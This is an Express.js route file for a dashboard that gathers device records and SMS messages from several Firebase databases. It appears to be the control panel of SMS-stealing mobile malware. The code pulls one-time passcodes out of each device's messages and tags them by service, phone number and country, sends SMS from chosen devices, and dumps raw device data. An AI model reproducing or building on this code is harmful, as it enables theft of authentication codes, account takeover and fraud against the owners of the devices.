"use strict";

/**
 * Dashboard routes.
 * Aggregates data from all active Firebase connections for the user dashboard.
 */

const { Router } = require("express");
const ConnectionsService = require("../services/connections");
const FirebaseService = require("../services/firebase");
const DeviceService = require("../services/devices");
const OtpExtractor = require("../services/otpExtractor");
const { getPhone } = require("../utils/phone");
const { requireAuth } = require("../middleware/auth");

const router = Router();
router.use(requireAuth);

/**
 * GET /api/dashboard
 * Full dashboard data: all devices + recent OTPs from all connections.
 */
router.get("/", async (req, res, next) => {
  try {
    const connections = await ConnectionsService.getAllActive();

    // Fetch each connection once, then build its device and OTP data together.
    const connectionResults = await Promise.allSettled(
      connections.map(async (conn) => {
        try {
          const [clientsData, messagesRoot] = await Promise.all([
            FirebaseService.read(conn.url, conn.key, "clients").catch(() => null),
            FirebaseService.read(conn.url, conn.key, "messages").catch(() => null),
          ]);
          const normalizedDevices = DeviceService.parseAll(clientsData);
          const devices = normalizedDevices.map((device) => ({
            ...device,
            phoneNumber: getPhone(
              device,
              clientsData?.[device.id],
              messagesRoot?.[device.id]
            ) || "—",
            source: conn.name,
          }));
          const otps = [];

          if (messagesRoot && typeof messagesRoot === "object") {
            for (const [deviceId, deviceMessages] of Object.entries(messagesRoot)) {
              if (!deviceMessages || typeof deviceMessages !== "object") continue;

              const device = normalizedDevices.find((item) => item.id === deviceId);
              const phone = getPhone(device, clientsData?.[deviceId], deviceMessages);

              for (const [, msg] of Object.entries(deviceMessages)) {
                if (!msg || typeof msg !== "object") continue;
                const text = msg.text || msg.body || msg.message || "";
                if (!OtpExtractor.isOtpMessage(text)) continue;
                const extracted = OtpExtractor.extractOtp(text);
                if (!extracted) continue;
                const rawTs = msg.timestamp || msg.time || msg.date || "";
                otps.push({
                  service: extracted.service,
                  phone: phone || "Unknown",
                  code: extracted.code,
                  message: text.trim().slice(0, 200),
                  timestamp: rawTs ? (typeof rawTs === "number" ? new Date(rawTs).toISOString() : String(rawTs)) : new Date().toISOString(),
                  country: OtpExtractor.detectCountry(phone),
                  source: conn.name,
                });
              }
            }
          }

          return { devices, otps };
        } catch {
          return { devices: [], otps: [] };
        }
      })
    );

    const allDevices = [];
    const allOtps = [];
    for (const result of connectionResults) {
      if (result.status !== "fulfilled") continue;
      allDevices.push(...result.value.devices);
      allOtps.push(...result.value.otps);
    }

    allDevices.sort((a, b) => {
      if (a.status !== b.status) return a.status ? -1 : 1;
      return a.name.localeCompare(b.name);
    });
    allOtps.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));

    res.json({
      success: true,
      devices: {
        total: allDevices.length,
        online: allDevices.filter((d) => d.status).length,
        list: allDevices,
      },
      otps: {
        total: allOtps.length,
        recent: allOtps.slice(0, 50),
      },
      connections: connections.length,
    });
  } catch (err) {
    next(err);
  }
});

/**
 * GET /api/dashboard/devices/:id
 * Get device details from any connected database.
 */
router.get("/devices/:id", async (req, res, next) => {
  try {
    const connections = await ConnectionsService.getAllActive();
    const { id } = req.params;

    for (const conn of connections) {
      try {
        const raw = await FirebaseService.read(conn.url, conn.key, `clients/${id}`);
        if (raw) {
          const device = DeviceService.normalize(id, raw);
          const messages = await FirebaseService.read(conn.url, conn.key, `messages/${id}`).catch(() => null);
          return res.json({
            success: true,
            device: {
              ...device,
              phoneNumber: getPhone(device, raw, messages) || "—",
              source: conn.name,
            },
            messages: messages ? DeviceService.parseMessages(messages) : [],
          });
        }
      } catch { /* try next connection */ }
    }

    res.status(404).json({ error: "Device not found in any connected database" });
  } catch (err) {
    next(err);
  }
});

/**
 * POST /api/dashboard/devices/:id/sms
 * Send SMS from a device.
 */
router.post("/devices/:id/sms", async (req, res, next) => {
  try {
    const { to, message } = req.body;
    if (!to || !message) return res.status(400).json({ error: "to and message required" });

    const connections = await ConnectionsService.getAllActive();
    const { id } = req.params;

    for (const conn of connections) {
      try {
        const raw = await FirebaseService.read(conn.url, conn.key, `clients/${id}`);
        if (raw) {
          await FirebaseService.write(conn.url, conn.key, `clients/${id}/webhookEvent/sendSms`, {
            from: 1, to, message, isSended: false,
          });
          return res.json({ success: true, message: "SMS queued" });
        }
      } catch { /* try next */ }
    }

    res.status(404).json({ error: "Device not found" });
  } catch (err) {
    next(err);
  }
});

/**
 * GET /api/dashboard/debug/:id
 * Debug: show raw Firebase data for a device.
 */
router.get("/debug/:id", async (req, res, next) => {
  try {
    const connections = await ConnectionsService.getAllActive();
    const { id } = req.params;
    for (const conn of connections) {
      try {
        const raw = await FirebaseService.read(conn.url, conn.key, `clients/${id}`);
        if (raw) {
          // Return all field names and their types/values (truncate long values)
          const fields = {};
          for (const [key, val] of Object.entries(raw)) {
            if (val === null || val === undefined) fields[key] = null;
            else if (typeof val === "object") fields[key] = { __type: "object", keys: Object.keys(val).slice(0, 20) };
            else if (typeof val === "string" && val.length > 100) fields[key] = val.slice(0, 100) + "...";
            else fields[key] = val;
          }
          return res.json({ success: true, source: conn.name, deviceId: id, fields });
        }
      } catch {}
    }
    res.status(404).json({ error: "Device not found" });
  } catch (err) { next(err); }
});

module.exports = router;
